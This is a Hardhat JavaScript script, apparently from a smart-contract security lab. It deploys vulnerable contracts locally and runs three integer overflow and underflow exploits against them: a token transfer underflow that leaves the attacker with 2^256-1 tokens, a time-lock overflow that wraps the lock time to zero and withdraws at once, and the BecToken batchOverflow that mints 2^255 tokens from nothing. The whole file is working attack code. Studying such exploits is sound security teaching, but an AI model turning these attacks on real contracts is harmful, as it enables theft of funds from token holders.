// ATTACK only: runs the exploits on the VULNERABLE (original) contracts.
//   npx hardhat run scripts/attack.js     (CASE=token|timelock|bec to pick one)
const { ethers } = require("hardhat");
const L = console.log;
const head = (s) => L("\n" + "=".repeat(66) + "\n" + s + "\n" + "=".repeat(66));
const which = (process.env.CASE || "all").toLowerCase();
const on = (k) => which === "all" || which === k;

async function main() {
  const [owner, attacker, r1, r2] = await ethers.getSigners();
  if (on("token")) {
    head("ATTACK 1: Token underflow");
    const c = await (await ethers.getContractFactory("Token")).deploy(20);
    L("attacker balance before:", String(await c.balanceOf(attacker.address)));
    await (await c.connect(attacker).transfer(owner.address, 1)).wait();
    L("attacker balance after :", String(await c.balanceOf(attacker.address)), " <- 2^256-1");
  }
  if (on("timelock")) {
    head("ATTACK 2: TimeLock overflow");
    const c = await (await ethers.getContractFactory("TimeLock")).deploy();
    await (await c.connect(attacker).deposit({ value: ethers.parseEther("1") })).wait();
    const t = await c.lockTime(attacker.address);
    L("lockTime before:", String(t));
    await (await c.connect(attacker).increaseLockTime(ethers.MaxUint256 - t + 1n)).wait();
    L("lockTime after :", String(await c.lockTime(attacker.address)), " <- wrapped to 0");
    await (await c.connect(attacker).withdraw()).wait();
    L("withdraw() succeeded immediately -> 1-week lock bypassed");
  }
  if (on("bec")) {
    head("ATTACK 3: BecToken batchOverflow");
    const c = await (await ethers.getContractFactory("BecToken")).deploy();
    L("receiver1 before:", String(await c.balanceOf(r1.address)));
    await (await c.connect(attacker).batchTransfer([r1.address, r2.address], 2n ** 255n)).wait();
    L("receiver1 after :", String(await c.balanceOf(r1.address)), " <- 2^255 minted from nothing");
  }
}
main().catch((e) => { console.error(e); process.exit(1); });
